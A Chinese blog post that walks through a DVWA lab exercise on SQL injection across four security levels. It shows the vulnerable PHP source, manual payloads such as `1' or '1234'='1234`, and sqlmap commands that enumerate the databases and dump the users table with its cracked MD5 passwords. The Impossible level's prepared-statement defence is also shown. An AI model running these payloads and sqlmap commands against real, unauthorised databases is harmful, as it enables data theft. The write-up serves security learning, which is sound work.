---
title: 基于 dvwa 和 sqlmap 的 SQL 注入攻击
categories:
  - WebSecurity
tags:
  - SQL injection
  - dvwa
abbrlink: 2261a6f2
date: 2022-06-20 00:07:05

---

## 前置知识

- 当 `web` 应用向后台数据库传递 `SQL` 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的 `SQL` 语句，直接输入数据库引擎执行，获取或修改数据库中的数据。
- 二次注入是攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 `SQL` 查询语句所导致的注入。
- 手动注入和使用 `sqlmap` 自动注入的方法。

## 配置环境

在我做这个实验的时候，使用的是 `LAMP` 环境，在环境中下载 `DVWA` 靶场，配置相关设置，我的实验环境如下：

```
OS: Ubuntu 20.04.3 LTS
Apache: Apache/2.4.41 (Ubuntu)
MySQL Version: 8.0.26-0ubuntu0.20.04.2
PHP Version: 8.0.10
phpMyAdmin Version: 5.1.1
```

在我创作这篇博客时，我使用的是 `docker` 来进行环境配置。首先执行 `docker search dvwa` 查找镜像，然后执行 `docker pull [citizenstig/dvwa](选一个最靠前的)` 下载镜像，最后，执行 `docker run --name dvwa citizenstig/dvwa` 生成容器，最后，使用 `vscode` 打开容器，配置端口（80端口）转发。

进入网站 http://localhost/dvwa/setup.php ，登录（默认用户为 `admin` ，密码是 `password`）。

## Low 等级

点击 `DVWA Security` ，修改等级为 `low` 。

### 分析 php 源码

进入 `SQL injection` 。首先，我们查看源代码，这里就是接收了一个参数 `id` ，然后执行 `sql` 语句，并且是字符型的：

```php
$id = $_REQUEST[ 'id' ];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
// id 有引号，字符型
```

### 手动注入

因此，在表单里插入 `SQL` 语言（例如 `1' or '1234'='1234` ，提交表单，就可以得到一些数据，分析可知，这里的条件一定满足，因此返回的是所有的数据：

```
ID: 1' or '1234'='1234
First name: admin
Surname: admin
ID: 1' or '1234'='1234
First name: Gordon
Surname: Brown
ID: 1' or '1234'='1234
First name: Hack
Surname: Me
ID: 1' or '1234'='1234
First name: Pablo
Surname: Picasso
ID: 1' or '1234'='1234
First name: Bob
Surname: Smith
```

### sqlmap 自动注入

这样一个一个填很浪费时间，浪费精力。因此，我们可以使用 `sqlmap` 工具来进行自动化注入。按照说明配置好工具之后，输入下面的命令，就可以看到这里可以使用 `boolean-based blind` 、 `error-based` 、 `time-based blind` 和 `UNION query` 这几种方式进行注入：

```shell
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=233&Submit=Submit" --batch --cookie "PHPSESSID=ara6drni1r464b5vu2bu51cjk4; security=low"
# 注意 url 和 cookie 执行从浏览器抓包工具获取

# 结果
sqlmap identified the following injection point(s) with a total of 143 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=233' OR NOT 6220=6220#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: id=233' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171716b71,(SELECT (ELT(9664=9664,1))),0x716b627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- NInX&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=233' AND (SELECT 8305 FROM (SELECT(SLEEP(5)))aIhA)-- ALvX&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=233' UNION ALL SELECT CONCAT(0x7171716b71,0x6d6f645958746e434570746374515164675a5a5778666e517947427969725354467776425a66436e,0x716b627871),NULL#&Submit=Submit
---
```

然后，我们添加 `--bds` 标志，再次运行，就可以破解得到当前的数据库：

```
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
```

然后，我们可以通过标志 `-D dvwa --tables` 来指定要渗透测试的数据库，这样，我们就可以拿到该数据库下的表名：

```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

然后，我们指定数据库并且指定表名，拿到列，通过标志 `-D dvwa -T users --column` :

```
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+
```

最后，我们当然希望拿到表里面的数据了，通过标志 `-D dvwa -T users --dump` 即可实现：

```
Database: dvwa                                                                                                                 
Table: users
[5 entries]
+---------+---------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | avatar                                      | user    | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | http://localhost/hackable/users/admin.jpg   | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2022-06-19 15:01:58 | 0            |
| 2       | http://localhost/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2022-06-19 15:01:58 | 0            |
| 3       | http://localhost/hackable/users/1337.jpg    | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2022-06-19 15:01:58 | 0            |
| 4       | http://localhost/hackable/users/pablo.jpg   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2022-06-19 15:01:58 | 0            |
| 5       | http://localhost/hackable/users/smithy.jpg  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2022-06-19 15:01:58 | 0            |
+---------+---------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+
```

这里的密码是通过 `md5` 加密的，遍历 `sqlmap` 的字典可以破解一些简单的密码。

## Medium 等级

修改为 `medium` 等级。

### 分析 php 源码

```php
$id = $_POST[ 'id' ]; # post 请求

$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
# id 没有引号，数字型
```

### 手动注入

这个等级没有输入框了，但是，我们可以通过修改 `html` 代码来实现注入，如下，注意，这里不能写引号了，原因就是数字型不需要引号：

![image-20220619233451356](../images/image-20220619233451356.png)

### sqlmap 自动注入

知道了手动注入的方式之后，我们就可以继续使用 `sqlmap` 来实现自动化注入了。

通过浏览器抓包工具我们可以得到一些请求信息：

```
Request URL: http://localhost/vulnerabilities/sqli/
Request Method: POST
Cookie: PHPSESSID=ara6drni1r464b5vu2bu51cjk4; security=medium
```

不同于 `low` 等级的 `get` 请求方式，这里采用的是 `post` 请求，但是我们在浏览器抓包工具中找不到 `post` 的参数，不过没关系，可以使用 `burpsuite` 来解决，使用这个专门的抓包工具，我们可以看到其实 `post` 的数据就是 `id=2&Submit=Submit` ，那么，就能继续使用 `sqlmap` 来自动化进行注入了。这里我们跳过中间步骤，因为和前面都是一样的，没有什么特别的。 `--data "id=2&Submit=Submit"` 标志是 `post` 请求要提交的文件， `--flush-session` 标志是因为 `low` 已经求过一次了，清除缓存，否则不会继续注入，会直接返回缓存的结果。命令如下：

```shell
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/" --batch --cookie "PHPSESSID=ara6drni1r464b5vu2bu51cjk4; security=medium" --data "id=2&Submit=Submit" -D dvwa -T users --dump --flush-session
```

不出意外的，我们就会得到和上面一样的结果。

## High 等级

### 分析 php 源码

```php
$id = $_SESSION[ 'id' ];

$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

我们看到 `id` 是一个 `session` 请求，不过没关系，我们不用管，然后 `id` 是字符型的，所以注意添加引号，最后限制了输出一行，不过我们其实也可以通过 `#` 将后面的内容注释掉。

### 手动注入

虽然这里是一个二级注入，测试了几项发现手动填写表单是就像 `low` 等级一样：

### sqlmap 自动注入

虽然很困难，但是 `sqlmap` 还是很强大的。首先，我们这次借助专业的抓包工具 `burpsuite` ，设置好代理，然后就可以看到请求的内容，将抓包到的请求信息保存到文件 `high.txt` 中，然后执行：

```shell
python sqlmap.py -r high.txt --second-url "http://localhost/vulnerabilities/sqli/" --batch --flush-session
```

`--second-url` 是二级注入的另一个页面，然后自动操作，并且清空之前的缓存。 `sqlmap` 自动注入后，发现 `post` 请求的参数 `id` 有如下三种注入漏洞（。接下来，和上面一样，使用 `--dbs` 、 `-D dwva --tables` 、 `-D dwva -T users --dump` 等标志拿到所有需要的数据。

```
sqlmap identified the following injection point(s) with a total of 99 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: id=1' AND 1155=(SELECT (CASE WHEN (1155=1155) THEN 1155 ELSE (SELECT 1708 UNION SELECT 9973) END))-- IfmX&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 5983 FROM (SELECT(SLEEP(5)))bCUn) AND 'CuOS'='CuOS&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7176787a71,0x4a624164734e68675857796d6d6b4f6f636e587a6650704c6a476f756e6b69594f4b5254744f5161,0x716a766b71),NULL-- -&Submit=Submit
---
```

分析上面的请求头，我们其实只需要一些数据即可，因此，可以将这些参数写到命令中，那么就不需要得到 `high.txt` 文件了，使用下面的命令即可。 `--level` 表示测试等级，最大为 `5` 。

```shell
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/session-input.php#" --data="id=1&Submit=Submit" --second-url="http://localhost/vulnerabilities/sqli/" --cookie="PHPSESSID=d9ou799sikqs084p6iqj7ffmf3; security=high" --level=2 --batch -D dvwa -T users --dump --flush-session
```

最后结果和上面两个等级相同，不再赘述。

## Impossible 等级

### 分析 php 源码

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];  // 拿到数据

    // Was a number entered?
    if(is_numeric( $id )) {  // 判断是否为数字
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned // 保证输出只有一条
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

这里看到，这里在执行 `sql` 语句之前处理了 `id` ，一定要满足是一个整数，然后把 `id` 转为了 `int` 才执行 `sql` 语句，并且，执行完成之后还要保证结果只有一个才输出，因此，是无法注入的。

## 小结

通过本次实验，学习了 `sql` 注入的基本原理并尝试进行了手动注入，然后学习使用自动注入工具 `sqlmap` ，方便的得到敏感数据。最重要的是，本次实验启示了我，在开发自己的服务时，如何去防御 `sql` 注入。